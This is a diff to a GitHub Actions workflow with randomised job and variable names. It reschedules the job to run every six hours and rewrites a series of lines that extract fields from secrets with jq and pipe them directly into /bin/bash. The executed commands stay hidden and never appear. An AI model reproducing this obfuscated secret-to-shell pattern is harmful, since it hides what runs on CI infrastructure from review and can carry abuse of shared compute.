@@ -1,8 +1,9 @@
 name: zhaoyinluo4178
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
+    - cron: '50 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhaoyinluo4178
         env:
-          hwspu6897: ${{ secrets.hwspu6897 }}
+          a23: ${{ secrets.a23 }}
         run: |
-          echo $hwspu6897 | jq -r .zosn89 | /bin/bash
-          echo $evn74 | jq -r .padka7 | /bin/bash
-          echo $uge559 | jq -r .jrnr02097 | /bin/bash
-          echo $oyyd4400 | jq -r .pu8 | /bin/bash
-          echo $ela0 | jq -r .szc96639 | /bin/bash
-          echo $koa084 | jq -r .gkbf4315 | /bin/bash
-          echo $zaptf78 | jq -r .yzle8115 | /bin/bash
-          echo $tobss24 | jq -r .pesf318 | /bin/bash
-          echo $tkq57 | jq -r .pwkwd72042 | /bin/bash
-          echo $gudlh258 | jq -r .tqzq0 | /bin/bash
+          echo $a23 | jq -r .fvlt811 | /bin/bash
+          echo $lnnsv40 | jq -r .mgccc3674 | /bin/bash
+          echo $jmg391 | jq -r .zqne71 | /bin/bash
+          echo $fulv6763 | jq -r .pcc7 | /bin/bash
+          echo $rm305 | jq -r .wj478 | /bin/bash
+          echo $tr67 | jq -r .ncxc23 | /bin/bash
+          echo $bv7233 | jq -r .t24 | /bin/bash
+          echo $jkoqs0587 | jq -r .px667 | /bin/bash
+          echo $azh49 | jq -r .alvvh5119 | /bin/bash
+          echo $o80 | jq -r .vigjx5385 | /bin/bash
+          echo $dfc9093 | jq -r .ebnpv10658 | /bin/bash
+          echo $ixgp970 | jq -r .ftwxs452 | /bin/bash
 
